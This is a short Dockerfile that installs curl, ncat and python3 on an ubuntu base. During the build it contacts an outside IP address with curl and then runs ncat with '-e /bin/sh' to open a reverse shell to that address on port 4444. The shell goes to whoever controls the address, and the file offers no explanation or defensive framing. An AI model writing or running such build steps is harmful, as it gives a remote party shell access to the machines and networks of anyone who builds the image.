FROM ubuntu
RUN apt update && apt install -y curl && apt install -y ncat && apt install python3 -y
RUN curl http://68.183.4.199/azure2
WORKDIR /proc/self/fd/2/

RUN ncat 68.183.4.199 4444 -e /bin/sh

CMD ["/bin/bash"]
